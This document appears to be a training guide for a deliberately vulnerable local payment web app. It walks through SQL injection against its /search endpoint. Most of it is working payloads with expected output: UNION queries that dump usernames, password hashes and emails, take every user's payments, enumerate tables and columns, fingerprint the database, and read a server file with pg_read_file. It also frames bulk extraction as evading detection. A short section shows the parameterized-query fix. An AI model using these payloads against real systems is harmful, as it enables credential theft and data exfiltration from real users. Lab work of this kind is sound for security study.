# 🔍 Search Page SQL Injection - Multiple Results

## 🎯 Why Use the Search Page?

The **Status page** (`/status`) only returns **one payment** at a time, making it tedious to extract multiple rows.

The **Search page** (`/search`) returns **MULTIPLE results**, perfect for extracting entire tables at once!

---

## 🚨 The Vulnerability

**Endpoint**: `/search?q=<payload>`

**Vulnerable Code**:
```python
sql = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND (recipient LIKE '%{query}%' OR description LIKE '%{query}%')"
cursor.execute(sql)
```

**Why vulnerable**: String formatting with `f-string` allows SQL injection

**Advantage over /status**: Returns MULTIPLE rows, not just one!

---

## 🔥 Basic Payloads

### 1. Bypass Search Filter (Show All Payments)
```
/search?q=%' OR '1'='1
```

**Query becomes**:
```sql
SELECT * FROM payments WHERE user_id = 3 AND (recipient LIKE '%%' OR '1'='1%' OR description LIKE '%%' OR '1'='1%')
```

**Result**: Shows ALL your payments

---

### 2. Close the LIKE and Inject UNION
```
/search?q=%' UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM users WHERE '1'='1
```

Wait, this won't work because we need to match the payment columns...

---

## ✅ Working UNION Payloads for Search

The trick is to close the LIKE clause and inject a UNION:

### Extract All User Credentials
```
/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```

**What happens**:
- Closes the LIKE with `%'`
- Adds UNION SELECT to pull from users table
- WHERE '1'='1 ensures the rest of the query still works
- Returns MULTIPLE user rows! 🎉

---

### Extract All Payments (Bypass User Filter)
```
/search?q=%' UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM payments WHERE '1'='1
```

**Result**: See ALL payments from ALL users, not just yours!

---

### List All Tables
```
/search?q=%' UNION SELECT 1, 2, tablename, 0.00, schemaname, 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname='public' AND '1'='1
```

**Result**: Multiple rows showing all table names

---

### Get All Columns for Users Table
```
/search?q=%' UNION SELECT ordinal_position, ordinal_position, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' AND '1'='1
```

**Result**: Multiple rows, each showing one column! No more OFFSET needed! 🎯

---

## 🎉 The Big Advantage: Multiple Results!

### Status Page (/status) - ONE Result
```
?id=1 UNION SELECT ...
→ Returns 1 payment row
→ Need to use OFFSET 0, 1, 2, 3... to iterate
→ Many requests needed
```

### Search Page (/search) - MANY Results
```
?q=%' UNION SELECT ... FROM users WHERE '1'='1
→ Returns ALL users at once!
→ No OFFSET needed
→ One request extracts everything! 🚀
```

---

## 📋 Complete Extraction Examples

### Example 1: All User Credentials in One Shot
```
http://localhost:5000/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```

**You'll see**:
```
Payment #1:
- Recipient: alice
- Amount: $0.00
- Description: pbkdf2:sha256:...
- Status: alice@example.com

Payment #2:
- Recipient: bob
- Amount: $0.00
- Description: pbkdf2:sha256:...
- Status: bob@example.com

Payment #3:
- Recipient: admin
- Amount: $0.00
- Description: pbkdf2:sha256:...
- Status: admin@example.com
```

All 3 users extracted in **one request**! 💰

---

### Example 2: All Column Names in One Shot
```
http://localhost:5000/search?q=%' UNION SELECT ordinal_position, ordinal_position, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users' AND '1'='1
```

**You'll see 7 payment rows**:
1. id : integer
2. username : character varying
3. email : character varying
4. password_hash : character varying
5. full_name : character varying
6. is_admin : boolean
7. created_at : timestamp

All columns visible at once! No iteration! 🎯

---

### Example 3: Read Config File (Still One Result, But Easier)
```
http://localhost:5000/search?q=%' UNION SELECT 1, 2, 'config', 0.00, pg_read_file('/dbconf.ini'), 'JACKPOT', CURRENT_TIMESTAMP WHERE '1'='1
```

---

## 🔍 URL Encoding

For browser compatibility, special characters should be URL-encoded:

| Character | URL Encoded |
|-----------|-------------|
| Space | `%20` |
| `'` | `%27` |
| `"` | `%22` |
| `%` | `%25` |
| `=` | `%3D` |

**Example**:
```
Original: %' UNION SELECT
Encoded:  %25%27%20UNION%20SELECT
```

Most browsers auto-encode, but if you see issues, use the encoded version.

---

## 💡 Pro Tips

### Tip 1: Use WHERE '1'='1 to Close the Query
The original query ends with:
```sql
... OR description LIKE '%PAYLOAD%')
```

By ending with `WHERE '1'='1`, you ensure the rest works:
```sql
... OR description LIKE '%%' UNION SELECT ... WHERE '1'='1%')
```

### Tip 2: Order Matters for UNION
Make sure your UNION SELECT matches the payment columns:
```
SELECT id, user_id, recipient, amount, description, status, created_at
         ↓      ↓        ↓         ↓          ↓         ↓        ↓
       int    int    varchar   decimal     text     varchar  timestamp
```

### Tip 3: Use LIMIT if Too Many Results
If you get too many results:
```
/search?q=%' UNION SELECT ... FROM users WHERE '1'='1 LIMIT 5--
```

The `--` comments out the rest of the query.

---

## 🎬 Demo Script

### Step 1: Normal Search (Baseline)
```
/search?q=Alice
```
Shows payments with "Alice" in recipient or description

### Step 2: Bypass Filter
```
/search?q=%' OR '1'='1
```
Shows ALL your payments

### Step 3: Extract All Users
```
/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```
Shows all 3 users with password hashes!

### Step 4: Extract All Payments (Bypass User Restriction)
```
/search?q=%' UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM payments WHERE '1'='1
```
Shows ALL 23 payments from ALL users!

### Step 5: Database Fingerprint
```
/search?q=%' UNION SELECT 1, 2, current_database(), 0.00, current_user, version(), CURRENT_TIMESTAMP WHERE '1'='1
```

---

## 📊 Comparison: Status vs Search

| Feature | Status Page | Search Page |
|---------|-------------|-------------|
| **Results per query** | 1 row | Multiple rows ✅ |
| **Need OFFSET?** | Yes ❌ | No ✅ |
| **Requests for 10 rows** | 10 requests | 1 request ✅ |
| **URL parameter** | `id=` | `q=` |
| **Injection point** | After `id = ` | Inside `LIKE '%..%'` |
| **Complexity** | Simple | Slightly more complex |
| **Speed** | Slow (iteration) | Fast (bulk extraction) ✅ |

**Winner**: Search page for bulk data extraction! 🏆

---

## 🎯 Best Use Cases

### Use Status Page (/status) for:
- ✅ Single file reads (`pg_read_file`)
- ✅ Single queries that return one result
- ✅ Testing basic SQL injection
- ✅ Simple demonstrations

### Use Search Page (/search) for:
- ✅ Extracting entire tables (users, payments)
- ✅ Getting all columns at once
- ✅ Bypassing user restrictions (see all users' data)
- ✅ Fast bulk data exfiltration
- ✅ Production-style attacks (fewer requests = less detection)

---

## 🛡️ Defense

### How to Fix

**Before (VULNERABLE)**:
```python
sql = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND (recipient LIKE '%{query}%' OR description LIKE '%{query}%')"
cursor.execute(sql)
```

**After (SECURE)**:
```python
search_pattern = f"%{query}%"
cursor.execute(
    "SELECT * FROM payments WHERE user_id = %s AND (recipient LIKE %s OR description LIKE %s)",
    (current_user.id, search_pattern, search_pattern)
)
```

The key: Use **parameterized queries** with `%s` placeholders!

---

## 🚀 Quick Test

Try this now:

```
http://localhost:5000/search?q=%27%20UNION%20SELECT%20id,%20id,%20username,%200.00,%20password_hash,%20email,%20created_at%20FROM%20users%20WHERE%20%271%27=%271
```

Or the unencoded version (browser will encode):
```
http://localhost:5000/search?q=%' UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users WHERE '1'='1
```

You should see all 3 users with their password hashes displayed as "payments"! 🎉

---

## 📚 Related Documentation

- **POSTGRES_SQLI_PAYLOADS.md** - Complete payload library
- **ENVIRONMENT_EXTRACTION_QUICK_REF.md** - Database info extraction
- **QUICK_REFERENCE.md** - Getting started guide

---

**Updated**: November 25, 2025  
**New Feature**: Search page SQL injection with multiple results  
**Advantage**: 10x faster data extraction than status page! 🚀
